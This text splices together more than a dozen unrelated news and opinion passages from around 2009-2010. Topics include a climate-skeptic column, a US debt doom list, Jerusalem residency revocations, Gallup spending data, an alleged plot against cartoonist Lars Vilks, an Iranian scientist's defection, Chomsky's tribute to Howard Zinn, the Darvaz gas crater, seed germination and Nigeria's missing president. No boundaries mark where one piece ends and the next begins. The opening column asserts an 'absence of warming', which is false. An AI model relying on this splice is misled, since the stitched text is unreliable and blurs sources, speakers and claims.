Last week , Todd Stern , America 's Special Envoy for Climate Change -- yes , there is one ; and people wonder where to begin cutting government -- warned that those interested in " undermining action on climate change " will seize on " whatever tidbit they can find . "
Tidbits like specious science , and the absence of warming ?
It is tempting to say , only half in jest , that Stern 's portfolio violates the First Amendment , which forbids government from undertaking the establishment of religion .
A religion is what the faith in catastrophic man-made global warming has become .
It is now a tissue of assertions impervious to evidence , assertions which everything , including a historic blizzard , supposedly confirms and nothing , not even the absence of warming , can falsify .
Most Americans believe that the U.S. economy will fully recover from this recent recession and will soon become stronger than ever .
But that is definitely not what is happening .
The truth is that the very foundations of the U.S. economy are coming apart and we are headed for a massive amount of financial trouble as a nation .
Collectively , the U.S. government , U.S. businesses and U.S. consumers have piled up the biggest mountain of debt in the history of the world .
This mountain of debt has enabled us to enjoy a spectacular standard of living for the past several decades , but now the bills are coming due and nobody seems to even realize how great of a financial disaster the U.S. now finds itself in the middle of .
The following are 10 huge flashing danger signs that show just how much of a mess the U.S. economy is in ….
#1) The FDIC is opening a satellite office in the Chicago area that will accommodate up to 500 temporary staffers and contractors to manage receiverships and liquidate assets from what they are expecting will be a massive wave of failed Midwest banks .
# 2) The U.S. Treasury Department announced on Tuesday that foreign holdings of U.S. Treasury securities fell by $ 53 billion in December , which is the biggest one month decline in history .
China alone reduced its holdings of U.S. Treasuries by $ 34.2 billion .
So if foreigners quite buying up all of our debt , what happens then ?
#3) Mortgage defaults in the U.S. have continued to hit record highs and housing prices are continuing to fall .
Now , a massive “ second wave ” of adjustable rate mortgages is scheduled to reset beginning in 2010 .
The first wave of adjustable rate mortgage resets absolutely devastated the U.S. housing market in 2007 and 2008 .
So what is this second wave of mortgage resets going to do to the U.S. economy ?
#4) In fact , one new study estimates that five million houses and condominiums will go through foreclosure over the next few years .
Needless to say , that would be absolutely catastrophic .
#5) The number of Americans who are declaring bankruptcy continues to skyrocket .
1.41 million Americans filed for personal bankruptcy in 2009 which represented a 32 percent increase over 2008 .
# 6) But how can Americans pay their bills without jobs ?
In some areas of the United States it is now nearly impossible to get a really good job unless you have an inside connection .
In fact , the mayor of Detroit estimates that the real unemployment rate in his city is approximately 45 to 50 percent .
# 7 ) America needs jobs , but soaring unemployment insurance taxes are discouraging small and mid-size companies from bringing on more workers .
According to the National Association of State Workforce Agencies , companies in at least 35 states will have to fork over even more in unemployment insurance taxes in 2010 .
Making it more costly to hire a new worker is not going to help put Americans back to work .
#8) The U.S. economy is facing a pension crisis of unprecedented magnitude .
The truth is that the vast majority of all pension funds in the United States , both public and private , are extremely underfunded .
With millions upon millions of Baby Boomers now at retirement age , there is simply no way that all of these unfunded pension obligations can be met .
Robert Novy - Marx of the University of Chicago and Joshua D. Rauh of Northwestern ’s Kellogg School of Management recently calculated the collective unfunded pension liability for all 50 U.S. states for Forbes magazine .
So what was the total that they came up with ?
3.2 trillion dollars .
#9 ) Not only that , but the Social Security system is also a silent monster that threatens to devastate U.S. government finances .
In fact , many analysts are now forecasting that the coming wave of Baby Boomers is going to bankrupt the entire Social Security system .
# 10 ) All of these economic problems come at a time when the U.S. national debt is exploding into the stratosphere .
The national debt is now over 12 trillion dollars and it is rising at a rate of about 3.8 billion dollars per day .
So how much is one trillion dollars ?
Well , if you spent one dollar every single second of every single day , it would take you over 31,000 years to spend one trillion dollars .
That is a lot of money .
The truth is that the U.S. is drowning in debt .
American consumers are broke .
American businesses are broke .
State governments are broke .
The U.S. federal government is broke .
The only way that we can keep things going is to borrow increasingly larger amounts of money .
But when we do borrow even more money we make our long - term problems even worse .
The day of reckoning for the U.S. economy is fast approaching and we are headed for some extremely difficult economic times .
Are you ready ?
JERUSALEM ( Reuters ) - Israel stripped Palestinians of Jerusalem residency status last year at a faster rate than at any time in the history of the Jewish state , an Israeli rights group said on Wednesday , citing official Israeli statistics .
“ Revocation of residence has reached frightening proportions , ” said Dalia Kerstein , executive director of Israel ’s HaMoked Center for the Defense of the Individual .
Statistics HaMoked obtained from the Ministry of Interior under a Freedom of Information Act request show 4,577 residents of East Jerusalem had their residence revoked in 2008 , which was greater than half the total revoked in the past 40 years .
The United Nations , the United States and the European have criticized Israel ’s policies in Jerusalem , which include the eviction of Palestinians from homes whose ownership they cannot prove , demolition of housing built without Israeli permits , and expansion of settlements on land occupied since a 1967 war .
The Palestinians say Israel ’s aim is to get rid of as many Palestinian residents as possible from East Jerusalem , to reduce their presence in its eastern districts and undermine the claim to half of the Holy City as capital of their future state .
“ The Interior Ministry campaign in 2008 is only part of a general policy whose aim is to limit the Palestinian population and preserve a Jewish majority in Jerusalem , whose future is supposed to be determined in negotiations , ” Kerstein said .
“ The Palestinians are natives of this city , not residents who have recently arrived , ” she added in a HaMoked statement .
Israel annexed East Jerusalem after capturing the area in the 1967 Middle East war and regards all of the city as its capital , a claim not recognized internationally .
Some 250,000 Palestinians now live in East Jerusalem and adjacent suburbs alongside 200,000 Israelis .
The government of Prime Minister Benjamin Netanyahu rejects calls for the city to be divided or shared as part of a peace agreement .
EU REPORT CITED
The United Nations and Western powers , which do not recognize Israel ’s claim , say the status of the city is one of the core issues to be settled in peace negotiations , which have been suspended for the past year and show no sign of resuming soon .
The Israeli newspaper Haaretz on Wednesday quoted an internal European Union document as saying Israel was helping Jewish right - wing zealots to implement its “ strategic vision ” of changing the demographics .
At the same time , the paper quoted the EU report as saying , the Israeli - run municipality was depriving Palestinians of needed building permits and providing them with inferior health , sanitation and educational services .
While 35 percent of Jerusalem citizens are Arab , less than 10 percent of the city ’s budget goes to Arab areas , the EU internal report said .
The consulate of Sweden , which holds the rotating presidency of the 27 - member EU , confirmed the existence of the report but refused to release it to Reuters .
A senior Palestinian official also refused to disclose the document .
HaMoked said the Israeli Interior Ministry had provided statistics for all of the years from 1967 to 2008 apart from 2002 for which it said no figures were available .
They show that 8,269 Palestinians had their Jerusalem residence revoked over the 40 - year - period .
The previous high was in 2006 , when 1,363 Palestinians were stripped of Jerusalem resident status .
No figures were available for the current year .
Palestinians in East Jerusalem have permanent resident status but Israeli law says it may be revoked if they spend more than seven consecutive years outside Israel , or take foreign residence or citizenship .
HaMoked quoted the Interior Ministry as saying most of the 2008 revocations -- under the previous government of Ehud Olmert -- were carried out on those grounds in March and April as part of an “ initiated check ” by the ministry .
Most of the cases lived abroad , the ministry said .
Only 38 cases involved Palestinians who moved to the Israeli - occupied territories outside East Jerusalem .
PRINCETON , NJ -- Gallup 's
Thanksgiving week results tend to confirm fears of a weak holiday sales season as consumer spending was unchanged from the prior week , even though it included Friday and Saturday of the Black Friday weekend .
At the same time , Gallup 's Economic Confidence Index and its Job Creation Index were essentially unchanged from the prior week .
A rather gloomy consumer mood and consumer spending -- trailing last year 's financial crisis - depressed comparables by 25 % -- may not be unexpected , but are surely a disappointing way to start the Christmas sales season for the nation 's retailers .
What Happened ( Week Ending Nov. 29 )
Consumer Spending was unchanged during Thanksgiving week , as self - reported daily spending in stores , restaurants , gas stations , and online averaged $ 69 -- the same as the prior week and not much different than a month ago ( $ 67 ) .
The flat consumer spending for the Thanksgiving holiday week compared to the prior week is in itself disappointing , but is even more so given the context of last year 's comparables .
Even as the financial crisis deepened in 2008 , consumers found a way to increase their Thanksgiving week spending to an average of $ 92 per day .
This year 's results -- 25 % below that spending level -- failed to match last year 's holiday week spending surge .
While spending last week probably suffered to some extent from the absence of a paycheck , the same was true a year ago .
A more detailed look at just Friday / Saturday spending shows a decline of 8.6 % compared to a year ago
Economic Confidence was essentially unchanged compared to the prior week as Gallup 's Economic Confidence Index was - 30 , compared to - 32 the prior week and - 28 for all of October .
Americans ' views of the economy going forward showed virtually no change , with 59 % saying the economy is " getting worse , " compared to 60 % the previous week .
Thirty - five percent of Americans described the economy as " getting better , " versus 34 % the prior week .
Consumer assessments of the current economy were also not much different from the previous week , with 47 % rating the economy " poor " and 12 % rating it " excellent " or " good , " compared to 48 % and 11 % , respectively , the prior week .
Economic confidence continued to languish even as the Dow Jones Average remained well above 10,000 and most Americans took time to be with family and friends .
Job Creation was essentially unchanged last week , as Gallup 's Job Creation Index was at +2 , not much different than the +1 of the prior two weeks , or the +3 of a month ago .
The percentage of employees saying their companies were hiring increased slightly to 26 % last week from 24 % the prior week , and was the same as a month ago .
The percentage saying their companies are letting people go was 24 % , essentially the same as the 23 % of the previous five weeks .
The jobs situation remains bleak -- better than earlier this year , but no better than a year ago , and with a 10.2 % unemployment rate .
In turn , this may help to explain , at least in part , why consumer spending continues to significantly trail last year 's levels .
What to Watch For
" Perhaps the most important thing this week 's jobs summit could do for 2010 is find a way to break the vicious cycle Gallup data reveal between job losses and spending cutbacks . "
Early this week , the U.S. markets will likely focus on Black Friday weekend sales and their implications for the holiday sales season , barring unexpected financial fallout associated with the Dubai World 's debt issue or President Obama 's Afghanistan speech .
Gallup 's daily spending data show Black Friday / Saturday spending down 8.6 % from a year ago .
This is consistent with Gallup 's earlier holiday spending forecast and early reports by the National Retail Federation .
Even more importantly , Gallup 's weekly consumer spending results show no overall spending increase compared to the prior week , and spending for Thanksgiving week down 25 % from a year ago .
It may be that the composition of spending this holiday season will change , as consumers spend less on activities such as eating out and travel while using these funds instead for Christmas gift buying .
Regardless , there is no indication in Gallup 's spending data during recent weeks , or so far this year , that this year 's spending will do anything but trail last year 's depressed spending levels during the holidays .
This coming week may be seen as a test of the idea that " cash will be king " this holiday season .
Many consumers get their paychecks this week , and the " paycheck effect " should be reflected by an increase in spending .
Given consumers ' efforts to use less credit , how sharp the increase is -- whether it can match last year 's $ 90 - plus range -- may tell how strong cash sales will be as part of this holiday season .
Simultaneously , it should provide added insights into what the nation 's retailers are facing during the remainder of the Christmas sales season .
As the week goes on , attention will turn to jobs once more , with the president 's jobs summit on Thursday and the government 's report on the unemployment rate on Friday .
Jobless claims showed surprisingly strong improvement last week on a seasonally adjusted basis , although the unadjusted claims actually increased .
While Gallup 's Job Creation
Index suggests jobless claims will increase this week , government reports for holiday weeks have seemed to understate claims activity .
Similarly , Gallup 's data suggest the November unemployment rate will stay at 10.2 % and could go even higher .
However , its surge into double digits last month could have led to many additional job seekers ' getting discouraged .
If they dropped out of the workforce , this could leave them uncounted when the unemployment rate is calculated .
As a result , there could be an artificial drop in the unemployment rate .
Regardless , Gallup spending data suggest jobs will continue to be hard to get as potential employers worry about top - line revenues .
In turn , it seems likely that the number of unemployed or underemployed Americans will continue to increase .
And the vicious cycle persists as consumers fearing for their jobs continue to cut back on their spending .
Perhaps the most important thing this week 's jobs summit could do for 2010 is find a way to break the vicious cycle Gallup data reveal between job losses and spending cutbacks .

Survey Methods
For Gallup Daily tracking , Gallup interviews approximately 1,000 national adults , aged 18 and older , each day .
The Gallup consumer perceptions of the economy and consumer spending results are based on random half - samples of approximately 500 national adults , aged 18 and older , each day .
The Gallup job creation and job loss results are based on a random half sample of approximately 250 current full - and part - time employees each day .
Results from the week of Nov. 23 - 29 , 2009 , are based on telephone interviews with 2,973 adults for the consumer perceptions and spending questions .
For these results , one can say with 95 % confidence that the maximum margin of sampling error is ±2 percentage points .
Results for the job creation and job loss questions are based on interviews with 1,725 employees , with a maximum margin of error of ±3 percentage points .
Interviews are conducted with respondents on land - line telephones and cellular phones .
In addition to sampling error , question wording and practical difficulties in conducting surveys can introduce error or bias into the findings of public opinion polls .
A story that is not getting nearly enough attention is the ruinous fiscal meltdown occurring in state after state , all across the country .
Taxes are being raised .
Draconian cuts in services are being made .
Public employees are being fired .
The tissue - thin national economic recovery is being undermined .
And in many cases , the most vulnerable populations  the sick , the elderly , the young and the poor  are getting badly hurt .
Arizona , struggling with a projected $ 2.6 billion budget shortfall , took the drastic step of scrapping its Children ’s Health Insurance Program .
That left nearly 47,000 low - income children with no coverage at all .
Gov. Jan Brewer is also calling for an increase in the sales tax .
She said , “ Arizona is navigating its way through the largest state budget deficit in its long history . ”
In New Jersey , the newly elected governor , Chris Christie , has proposed a series of budget cuts that , among other things , would result in public schools receiving $ 820 million less in state aid than they had received in the prior school year .
Some well - off districts would have their direct school aid cut off altogether .
Poorer districts that rely almost entirely on state aid would absorb the biggest losses in terms of dollars .
They ’re bracing for a terrible hit .
Irish police today arrested seven suspects over an alleged plot to kill a Swedish artist who drew the Prophet Muhammad with the body of a dog .
The target of the alleged assassination was Lars Vilks , who had a $ 100,000 ( £ 67,000 ) bounty put on his head by al - Qaida in 2007 , with a 50 % bonus if Vilks was " slaughtered like a lamb " by having his throat cut .
Another $ 50,000 was said to have been put on the life of Ulf Johansson , editor - in - chief of Nerikes Allehanda , the local newspaper that printed the cartoon .
The four men and three women , who were detained at about 10 am this morning , are in their mid-20s to late - 40s and are being held at stations in Waterford , Tramore , Dungarvan and Thomastown .
Garda sources have confirmed that some of those arrested hold Irish citizenship and a number are from the Middle East .
Some of those questioned have been confirmed as converts to Islam .
The suspects are being held under Ireland 's Criminal Justice Act 2007 .
Under Irish law they can be held in custody for up to seven days .
Ireland 's anti-terrorist special detective unit was involved in the operation .
A spokesman for the force said : " Throughout the investigation Garda Síochána has been working closely with law enforcement agencies in the United States and in a number of European countries . "
The CIA and the FBI were involved in the investigation .
Vilks ' cartoon caused outrage because dogs are considered unclean by conservative Muslims , and Islamic law generally opposes any depiction of the prophet for fear it could lead to idolatry .
The controversy over cartoons depicting Muhammad began in 2005 , when the Danish daily Jyllands - Posten printed 12 caricatures of the prophet after a children 's author said he could not find an illustrator for his book on the life of Muhammad .
The drawings sparked violent protests across the Muslim world , culminating with the burning of the Danish embassy in Damascus and its consulate in Beirut in February 2006 .
EXCLUSIVE : Iran Nuclear Scientist Defects to U.S. In CIA ' Intelligence Coup ' Shahram Amiri disappeared in Saudi Arabia , reportedly now resettled in the U.S .
March 30 , 2010  --
An award - winning Iranian nuclear scientist , who disappeared last year under mysterious circumstances , has defected to the CIA and been resettled in the United States , according to people briefed on the operation by intelligence officials .
The officials were said to have termed the defection of the scientist , Shahram Amiri , " an intelligence coup " in the continuing CIA operation to spy on and undermine Iran 's nuclear program .
A spokesperson for the CIA declined to comment .
In its declassified annual report to Congress , the CIA said , " Iran is keeping open the option to develop nuclear weapons though we do not know whether Tehran eventually will decide to produce nuclear weapons . "
Amiri , a nuclear physicist in his early 30s , went missing last June three days after arriving in Saudi Arabia on a pilgrimage , according to the Iranian government .
He worked at Tehran 's Malek Ashtar University , which is closely connected to Iran 's Revolutionary Guard , according to the Associated Press .
" The significance of the coup will depend on how much the scientist knew in the compartmentalized Iranian nuclear program , " said former White House counter - terrorism official Richard Clarke , an ABC News consultant .
" Just taking one scientist out of the program will not really disrupt it . "
Iran 's Foreign Minister , Manouchehr Mottaki , and other Iranian officials last year blamed the U.S. for " kidnapping " Amiri , but his whereabouts had remained a mystery until now .
According to the people briefed on the intelligence operation , Amiri 's disappearance was part of a long - planned CIA operation to get him to defect .
The CIA reportedly approached the scientist in Iran through an intermediary who made an offer of resettlement on behalf of the United States .
Since the late 1990s , the CIA has attempted to recruit Iranian scientists and officials through contacts made with relatives living in the United States , according to former U.S. intelligence officials .
Case officers have been assigned to conduct hundreds of interviews with Iranian - Americans in the Los Angeles area in particular , the former officials said .
Amiri has been extensively debriefed since his defection by the CIA , according to the people briefed on the situation .
They say Amiri helped to confirm U.S. intelligence assessments about the Iranian nuclear program .
In September , President Barack Obama announced the U.S. , the United Kingdom and France had evidence that Iran " has been building a covert uranium enrichment facility near Qom for several years . "
One Iranian web site reported that Amiri had worked at the Qom facility prior to his defection .
The New York Times reported Saturday that international inspectors and Western intelligence agencies suspect " Tehran is preparing to build more sites in defiance of United Nations demands . "
Officials at Iran 's mission to the United Nations did not immediately return calls seeking comment .
" The Americans are definitely letting the Iranians know that they are active in going after Iran 's nuclear program , " said Hooman Majd , an Iranian - American journalist .
A colleague of Amiri's at Tehran University called the disappearance " a disturbing sign " and blamed the Saudis for helping the U.S. , according government - approved English - language web site Press TV .
" The Saudi regime has effectively discredited itself and will be seen by those who know what has gone on in the region as being confined to American demands and effectively abiding by American wishes , " said Mohammad Marandi , a Tehran University professor , according to the Iranian web site .

Fed up with the predatory practices and utter absence of foreclosure help from Wall Street , local politicians , unions , and citizens in Los Angeles have decided to battle the big banks and financial services community themselves in LA ’s own version of “ Move Your Money . ”
While Washington stumbles its way toward financial reform , a bill in the Los Angeles city government right now would crack down on banks and lenders who hang out to dry beleaguered homeowners and would rein in unfair practices ; the bill would also create a series of policies calling for the divestment of LA ’s funds now held by large banks to more consumer - friendly ones .
The campaign , led in part by the union SEIU , will be voted on before LA ’s city council as early as next Friday , an SEIU rep says , and marks a major effort in the “ Move Your Money ” campaign to yank both consumers and cities ’ own dollars out of bailed out institutions that are n’t helping consumers , and into smaller , often local banks or credit unions .
A representative for SEIU today sent me the latest details of LA ’s “ Move Your Money ” bill under discussion by an LA city government committee , which recently took the following actions :
Adopted the standards for banking relationships based on foreclosure prevention , small business lending , neighborhood banking and send to the full Council for approval ; Called for the creation of a “ report card ” to evaluate the track record of banks that want to do business with the City .
This report would include data on the number of small business loans provided , evidence of working with homeowners facing foreclosure , the number and location of branches and ATMs and the use of federal TARP funds .
It would also allow LA policymakers the opportunity to choose banks that are giving back to the community ; Directed the Chief Legislative Analyst to mandate a system of periodic assessment in addition to the report card to evaluate whether financial institutions meet the standards of socially responsible investing .
This would include an annual , public report to the Council and Treasurer .
The city would then give preference to banks in the top two deciles and lead to possible divestment for those that do not ; Instructed the City Administrative Officer ( CAO ) , in coordination with the Treasurer , the Chief Legislative Analyst ( CLA ) and the City Attorney , to enforce a moratorium on any new swap deals , and renegotiate or cancel current interest rate swap transactions at no cost to the city .
The city will not do any business with banks refusing to renegotiate or cancel swaps deals .
The city is currently paying $ 10 million each year on swaps deals and would be forced to pay $ 29 million to exit them ; Requested that pension funds and proprietary departments with their own investment pools create similar policies to the ones proposed by the committee .
SEIU is also trying to introduce similar legislation in Maryland , and hopes the city - wide “ Move Your Money ” campaign will catch on .
It ’s an ambitious effort , without a doubt , and while a few hundred depositors moving their money from , say , Citigroup to Weequahic Credit Union is more symbolic than anything , convincing a half - dozen cities to do the same could have a sizeable impact .

Remembering Howard Zinn
Noam Chomsky
Resist Newsletter , March / April 2010
It is not easy for me to write a few words about Howard Zinn , the great American activist and historian who passed away a few days ago .
He was a very close friend for 45 years .
The families were very close too .
His wife Roz , who died of cancer not long before , was also a marvelous person and close friend .
Also somber is the realization that a whole generation seems to be disappearing , including several other old friends : Edward Said , Eqbal Ahmed , and others , who were not only astute and productive scholars but also dedicated and courageous militants , always on call when needed — which was constant .
A combination that is essential if there is to be hope of decent survival .
Howard ’s remarkable life and work are summarized best in his own words .
His primary concern , he explained , was “ the countless small actions of unknown people ” that lie at the roots of “ those great moments ” that enter the historical record — a record that will be profoundly misleading , and seriously disempowering , if it is torn from these roots as it passes through the filters of doctrine and dogma .
His life was always closely intertwined with his writings and innumerable talks and interviews .
It was devoted , selflessly , to empowerment of the unknown people who brought about great moments .
That was true when he was an industrial worker and labor activist , and from the days , 50 years ago , when he was teaching at Spellman college in Atlanta Georgia , a black college that was open mostly to the small black elite .
While teaching at Spellman , Howard supported the students who were at the cutting edge of the civil rights movement in its early and most dangerous days , many of whom became quite well - known in later years — Alice Walker , Julian Bond , and others — and who loved and revered him , as did everyone who knew him well .
And as always , he did not just support them , which was rare enough , but also participated directly with them in their most hazardous efforts — no easy undertaking at that time , before there was any organized popular movement and in the face of government hostility that lasted for some years .
Finally , popular support was ignited , in large part by the courageous actions of the young people who were sitting in at lunch counters , riding freedom buses , organizing demonstrations , facing bitter racism and brutality , sometimes death .
By the early 1960s a mass popular movement was taking shape , by then with Martin Luther King in a leadership role , and the government had to respond .
As a reward for his courage and honesty , Howard was soon expelled from the college where he taught .
A few years later he wrote the standard work on SNCC ( the Student non-violent Coordinating Committee ) , the major organization of those “ unknown people ” whose “ countless small actions ” played such an important part in creating the groundswell that enabled King to gain significant influence , as I am sure he would have been the first to say , and to bring the country to honor the constitutional amendments of a century earlier that had theoretically granted elementary civil rights to former slaves — at least to do so partially ; no need to stress that there remains a long way to go .
On a personal note , I came to know Howard well when we went together to a civil rights demonstration in Jackson Mississippi in ( I think ) 1964 , even at that late date a scene of violent public antagonism , police brutality , and indifference or even cooperation with state security forces on the part of federal authorities , sometimes in ways that were quite shocking .
After being expelled from the Atlanta college where he taught , Howard came to Boston , and spent the rest of his academic career at Boston University , where he was , I am sure , the most admired and loved faculty member on campus , and the target of bitter antagonism and petty cruelty on the part of the administration — though in later years , after his retirement , he gained the public honor and respect that was always overwhelming among students , staff , much of the faculty , and the general community .
While there , Howard wrote the books that brought him well - deserved fame .
His book Logic of Withdrawal , in 1967 , was the first to express clearly and powerfully what many were then beginning barely to contemplate : that the US had no right even to call for a negotiated settlement in Vietnam , leaving Washington with power and substantial control in the country it had invaded and by then already largely destroyed .
Rather , the US should do what any aggressor should : withdraw , allow the population to somehow reconstruct as they could from the wreckage , and if minimal honesty could be attained , pay massive reparations for the crimes that the invading armies had committed , vast crimes in this case .
The book had wide influence among the public , although to this day its message can barely even be comprehended in elite educated circles , an indication of how much necessary work lies ahead .
Significantly , among the general public by the war ’s end , 70 % regarded the war as “ fundamentally wrong and immoral , ” not “ a mistake , ” a remarkable figure considering the fact that scarcely a hint of such a thought was expressible in mainstream opinion .
Howard ’s writings — and , as always , his prominent presence in protest and direct resistance — were a major factor in civilizing much of the country .
In those same years , Howard also became one of the most prominent supporters of the resistance movement that was then developing .
He was one of the early signers of the Call to Resist Illegitimate Authority and was so close to the activities of Resist that he was practically one of the organizers .
He also took part at once in the sanctuary actions that had a remarkable impact in galvanizing antiwar protest .
Whatever was needed — talks , participation in civil disobedience , support for resisters , testimony at trials —
Howard was always there .
Even more influential in the long run than Howard ’s anti-war writings and actions was his enduring masterpiece , A People ’s History of the United States , a book that literally changed the consciousness of a generation .
Here he developed with care , lucidity , and comprehensive sweep his fundamental message about the crucial role of the people who remain unknown in carrying forward the endless struggle for peace and justice , and about the victims of the systems of power that create their own versions of history and seek to impose it .
Later , his “ Voices ” from the People ’s History , now an acclaimed theatrical and television production , has brought to many the actual words of those forgotten or ignored people who have played such a valuable role in creating a better world .
Howard ’s unique success in drawing the actions and voices of unknown people from the depths to which they had largely been consigned has spawned extensive historical research following a similar path , focusing on critical periods of American history , and turning to the record in other countries as well , a very welcome development .
It is not entirely novel — there had been scholarly inquiries of particular topics before — but nothing to compare with Howard ’s broad and incisive evocation of “ history from below , ” compensating for critical omissions in how American history had been interpreted and conveyed .
Howard ’s dedicated activism continued , literally without a break , until the very end , even in his last years , when he was suffering from severe infirmity and personal loss , though one would hardly know it when meeting him or watching him speaking tirelessly to captivated audiences all over the country .
Whenever there was a struggle for peace and justice , Howard was there , on the front lines , unflagging in his enthusiasm , and inspiring in his integrity , engagement , eloquence and insight , light touch of humor in the face of adversity , dedication to non-violence , and sheer decency .
It is hard even to imagine how many young people ’s lives were touched , and how deeply , by his achievements , both in his work and his life .
There are places where Howard ’s life and work should have particular resonance .
One , which should be much better known , is Turkey .
I know of no other country where leading writers , artists , journalists , academics and other intellectuals have compiled such an impressive record of bravery and integrity in condemning crimes of state , and going beyond to engage in civil disobedience to try to bring oppression and violence to an end , facing and sometimes enduring severe repression , and then returning to the task .
It is an honorable record , unique to my knowledge , a record of which the country should be proud .
And one that should be a model for others , just as Howard Zinn ’s life and work are an unforgettable model , sure to leave a permanent stamp on how history is understood and how a decent and honorable life should be lived .
Debbie Skomer runs the San Diego Coalition of Reason and recently attended a church at the urging of a friend — hey , why not ?
While at the church , Pastor David Hoffman made a challenge to his congregation :
He dared them to find anyone who was a Christian for a significant amount of time and only in their old age decided to lose their faith .
Debbie took him up on it .
She felt confident there were many atheists in that position out there .
Surely , at least one .
Through email correspondence , Hoffman laid out the specifics of the challenge ( edited here for clarity )
Find someone who has lived for Jesus Christ for a significant amount of time ( 40 - 50 yrs ) and is older ( 70 + ) .
That person would say that as they look back on their life they regretted their decision to trust Jesus .
That person would tell young people to not trust Jesus because he does n’t come through .
Hoffman added ( and I quote here ) :
Believe me Debbie this is going to be a challenge because Jesus is faithful to those who put their trust in him .
Is it a fair challenge ?
Maybe .
There are plenty of atheists who were deeply and sincerely Christian for a majority of their life before coming to their senses .
Were they 70 ?
None come to mind .
But 40s ?
That ’s easy to find .
Still , I have no doubt we can meet this challenge .
Someone else who came to mind was Dan Barker — he was n’t “ just ” a Christian , he was a preacher for the majority of two decades .
I know two decades is n’t the same as forty years and Dan ’s not exactly in his 70s , but it ’s still a pretty damn long amount of time .
And if you ’ve ever heard Dan speak about it , you can tell how much he regrets it .
Does he not count , Pastor Hoffman ?
If you think you or someone you know fits the bill , you can write to the pastor here .
Please do n’t send him anything nasty .
And please let us know ( in the comments ) what you write !
Let ’s overwhelm him with positive responses from atheists who were “ real ” Christians for a significant amount of time and came to atheism much later in life .
Let ’s see how he responds .
If a gate to hell existed , I bet this is how it would look like .
Locals from the town of Darvaz in Uzbekistan were really inspired when they named it this way .

When looking at the pictures , you ’d be tempted to think this is some sort of a volcano or magma - related process , but it ’s not .
Geologists are actually responsible ( they almost always are ) for this huge burning hole that ’s been lasting for 35 years already ( and wo n’t be stopping in the near future ) .
So , 35 years ago , they were digging and searching for gas .
Then suddenly , they found an underground cavern so wide and deep that caused all their camping and equipment to fall underground .
ADVERTISEMENT
I can’t imagine this happening this exact way ( I mean , where were they when the equipment fell ? ) but that ’s how the story goes , and exaggerations are actually welcome .
Anyway , nobody wanted to go down there because it was filled with poisonous gas , so in order to prevent the gas from getting out , they just decided to … burn it .
Gotta hand it to geologists , they always find the best solutions – it ’s what I would have done too .

It ’s not every day that I identify with George Washington , but as I retrieved my seed - filled Mason jar I was at one with our first president .
In December 1799 he wrote to a friend : “ I am particular always in my seeds , because nothing is more to be regretted ... than to sow seed that does not come up .... ”
You got that right , George .
There ’s no need for me to worry about the vegetable and flower seeds I ’ve just ordered .
Nearly all commercial seeds come in a packet stamped with a minimum “ germination number , ” the percentage of seeds that can be expected to sprout .
But I am concerned about the marigold seeds that I harvested last fall , then stupidly left in our unheated garage .
Unlike many perennial flowers and woody plants , the seeds of annuals like marigolds do n’t need cold stratification to germinate , especially when stored at well - below - freezing temperatures .
The arctic conditions my seeds endured may have doomed any chance they will sprout this spring .
There ’s an easy way to avoid the calamity of nothing coming up : proofing .
Proofing , or testing , is nothing more verifying whether or not seeds will sprout , whether or not they are viable .
How to test your seeds
• Place 10 seeds on half of a damp but not soppy white paper towel , then fold the other half over the seeds .
• Place the towel in an unsealed plastic bag and set it in a warm spot ( approximately 75 degrees F ; 24 C ) .
• Check the towel daily to ensure it stays damp – do not allow it to dry out .
• When germination stops , count the number of seeds that have sprouted .
If five of the 10 seeds sprout , the germination rate is 50 percent ( the number of germinated seeds divided by the number tested ) , so plant accordingly .
If you want 25 plants , sow at least 50 seeds .
• If no seeds spout , it ’s time to place an order with your favorite seed company .
[ Click here , here , and here to read Karan 's three - part article about her favorite small seed companies . ]
It turns out that half my marigold seeds germinated despite my mistreatment .
It ’s an affirmation of Henry David Thoreau ’s “ great faith in a seed . ”
I ’ll cross my fingers and sow thickly .
I 'll also store this year ’s seed harvest in a dry , cool spot well above 32 degrees F. ( 0 C ) .

I ’m mostly offline this week , as I ’m still healing from surgery and finding that reading and emailing are very painful … but one of the stories I have n’t been able to tear myself away from is the tale of Nigeria ’s missing president .
Since late November , Nigerian president Umaru Yar ’Adua has been in Saudi Arabia , receiving medical treatment .
Fair enough .
When he “ won ” a rigged election in 2007 , rumors swirled that he was in ill health – during the campaign , he challenged political opponents to a game of squash to demonstrate that he ’s a vital , healthy guy .
But Yar ’Adua has n’t just been out of the country – he ’s been incommunicado , out of touch with his cabinet and closest aides .
As a result , Africa ’s most populous nation has been functionally leaderless since November , a situation that ’s pretty hard for me to comprehend .
One of the newspapers I follow most closely in Nigeria is 234 Next , which has a track record of breaking interesting stories and a terrific online presence .
On January 10 , the paper reported that Yar ’Adua had suffered serious brain damage and no longer recognized his close aides .
They reported that the first lady was closely controlling access to the President and preventing journalists from understanding the depth of his illness .
Two days later , Yar ’Adua gave an interview via telephone to the BBC , announcing that he was receiving treatment in Saudi Arabia and recovering .
234 Next questioned the authenticity of the voice on the tape and demanded to be allowed to send a journalist to visit the president .
Now the newspaper is claiming victory , as Nigeria ’s National Assembly voted on Tuesday to make Vice President Goodluck Jonathan the acting president .
It ’s about time – ethnic violence has been flaring in Jos , militants continue to attack oil infrastructure , and Nigerians around the world are coping with the increased scrutiny that comes with Umar Farouk Abdulmutallab ’s failed attempt at downing a US - bound airplane .
Dialog in the Nigerian blogosphere helps explain the balancing act that is Nigerian politics .
Northerners – majority Muslim – and Southerners – majority Christian – have historically shared power by alternating who controlled the presidency .
With a Northern , Muslim president ( Yar ’Adua ) , Nigeria has a Southern , Christian VP , Jonathan Goodluck .
( It ’s worth noting that Yar ’Adua and Goodluck have both been characterized as marginal , obscure figures in Nigerian politics until their recent elevation to power .
Yar ’Adua was essentially appointed by former president Obasanjo , and Goodluck ’s father was a respected politician , but his son was far less well known . )
Some northerners are upset that power – which traditionally oscilates between the north and south – is now in the hands of a southerner , out of turn .
Some are questioning the legality of the move that put Goodluck in power .
And there ’s a frantic scramble to see who ’ll be Goodluck ’s deputy , because it ’s believed that the new acting VP will be a strong candidate for the presidency in 2011 .
Two things have struck me about the situation in Nigeria .
I should n’t be surprised , but I am that there ’s been so little international media attention to the Nigerian crisis .
It ’s impossible to overstate the importance of Nigeria to African stability .
It ’s a huge nation , incredibly powerful in terms of natural resources , struggling through the religious and ethnic tensions that face many African nations .
I would imagine that if Silvio Berlusconi suddenly disappeared from the world stage , there would be daily updates in global media .
( Remember what happened when South Carolina governor Mark Sanford disappeared for less than a week ? )
Second , I ’m amazed by the resilience that Nigerian governmental institutions have shown in the face of this crisis .
